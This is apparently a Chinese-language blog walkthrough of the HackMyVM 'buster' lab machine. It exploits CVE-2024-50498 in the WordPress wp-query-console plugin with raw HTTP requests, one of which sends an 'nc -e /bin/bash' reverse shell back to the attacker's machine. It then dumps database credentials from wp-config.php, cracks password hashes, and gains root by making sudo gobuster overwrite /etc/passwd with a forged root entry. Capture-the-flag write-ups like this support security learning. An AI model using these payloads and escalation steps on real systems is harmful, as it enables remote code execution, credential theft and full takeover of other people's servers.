---
title: HMV buster
published: 2025-02-16
pinned: false
description: HMV buster wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-02-16
pubDate: 2025-02-16
---

## buster

### 靶场链接

https://hackmyvm.eu/machines/machine.php?vm=buster

### 日常扫描
扫出来80端口，打开发现是wordpress
wpscan扫出来两个用户，继续扫描

### 反弹shell

wpscan --api-token  --url http://192.168.64.20/ -e u,ap --plugins-detection aggressive

扫出来漏洞插件wp-query-console，CVE-2024-50498
poc
```
POST /wp-json/wqc/v1/query HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console
Content-Type: application/json
Content-Length: 45
Origin: http://kubernetes.docker.internal
Connection: keep-alive
Priority: u=0

{"queryArgs":"phpinfo();","queryType":"post"}
```
改成josn格式，bp发过去

看一下被禁用的
><tr><td class="e">disable_functions</td><td class="v">passthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh</td><td class="v">passthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh</td></tr>
shell_exec可以试试

```
POST /wp-json/wqc/v1/query HTTP/1.1
Host: 192.168.64.20
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 83

{"queryArgs":"shell_exec('nc -e /bin/bash 192.168.64.3 4444');","queryType":"post"}
```

本地成功拿到shell，开始提权

### 提权

/usr/bin/script -qc /bin/bash /dev/null交互式终端
wp-config.php看看账号密码
```
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'll104567' );

/** Database password */
define( 'DB_PASSWORD', 'thehandsomeguy' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```
查数据库，得到密码
ta0 - $P$BDDc71nM67DbOVN/U50WFGII6EF6.r.
welcome - $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/

爆出来welcome的密码，104567，ta0的爆了好久没出来

ssh上去之后发现sudo -l发现gobuster可以sudo无密码执行，这个就是提权点
传个pspy上去看看运行的东西，发现/opt/.test.sh在后台运行，利用这个提权，但是不会（）。
看了佬的wp，有一个gobuster的通杀提权方法？

```#kali
perl -e 'print crypt("1","aa")'

cat a.py             
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if len(path) == 36:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)

python a.py
 * Serving Flask app 'a'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.64.3:80
Press CTRL+C to quit

#靶机
echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' > aaa
sudo /usr/bin/gobuster -w aaa -u http://192.168.64.3 -n -q -o /etc/passwd
cat /etc/passwd
su - /aaa
```
然后就提权成功了